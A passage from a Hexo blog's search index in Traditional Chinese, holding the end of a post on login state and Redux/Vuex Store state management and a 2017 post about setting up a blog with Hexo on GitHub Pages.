登入<br>ＯＯＯ發請求ＯＯＯ確認</p><p>加入了狀態的概念後，我們可以更快速的去理解剛剛的問題，最後也可以透過按登出按鍵的事件，來讓登入狀態回到未登入，使用起來的缺點是，狀態越定義越多時，畫出來的狀態遷移圖以及事件定義會變成世界奇觀，提個關鍵字 Redux-saga?</p><h2 id="狀態管理"><a href="#狀態管理" class="headerlink" title="狀態管理"></a>狀態管理</h2><p>元件化的影響，當動態的資料越來越多時，Vuex 還有 Redux 就定義出了一個叫做 Store 的名詞，裡面用一般的物件儲存了目前的狀態，下面就是官網範例中存了 todos 的狀態，可以看出待辦一已完成，待辦二未完成</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;todos&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;待辦一&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;completed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;待辦二&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;completed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>透過把狀態放在統一的位置外加受限制的資料流方向，提倡 single source of truth，所有的事件都只能特殊操作來改變 Store 裡的狀態，UI 也是依照特定的程序來依照 Store 來顯示，好像就簡單許多了，但說實話懂概念跟實際上用在專案裡還是有一段距離 XDDD</p>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Hexo 架設部落格</title>
      <link href="/2017/01/07/thinking-hello-2017/"/>
      <url>/2017/01/07/thinking-hello-2017/</url>
      
        <content type="html"><![CDATA[<blockquote><p>這弄弄那弄弄的，第一個 Blog 就打開了。</p></blockquote><p><a href="#build">跳過碎碎念 XD</a></p><p>去年年底，覺得好像差不多可以準備換工作了，就加加減減看了一些職缺，也發現有些職缺甚至開在 Github 的 <a href="https://github.com/f2etw/jobs/issues" title="issues">issues</a>裡，於是就開了一個帳號。</p><p>加上也發現許多工作面試有這個需求，所以就做一個吧。也因為之前公司是 SVN 所以沒用過 Git，這次先練習上傳了一些平常的練習。</p><p>之前也常常逛 Github，發現有些人會利用這個空間來開部落格，於是乎稍微研究了一下，就決定開始動手做一個 XDDD</p><p><img src="https://linyencheng.github.io/2017/01/07/thinking-hello-2017/me.jpg" alt="me"><br><small class="img-hint">放個今年第一張被拍的帥照好像是必須的 XDDD</small></p><hr><p id = "build"></p><h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p>其實 Github 本來就有提供個人放置解說網頁的功能，利用 <a href="https://pages.github.com/">GitHub Pages</a> + <a href="http://jekyllrb.com/">Jekyll</a> 就可以快速產生。</p><p>但樣式就稍微單調一點，上網查詢了以後,發現已經有框架可用了!!!<br>這次主要是利用 hexo 這套框架。</p><blockquote><p>Hexo: A fast, simple &amp; powerful blog framework</p></blockquote><p>而且還支援 <strong>Markdown</strong>，使用上其實真的蠻簡單的，也沒什麼大問題，搭配官網裡其他大大的樣式，簡單的就可以開始進入寫部落格的階段了 XDDD</p><p>而且也有提供把程式碼嵌在裡面的功能,根本專門給人寫筆記用的 XDDD</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">autoDetect</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ye, it is written in JavaScript!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>—— 2017.01</p>]]></content>
      
      
      <categories>
          
          <category> 雲端服務 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 個人成長 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 雲端服務 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
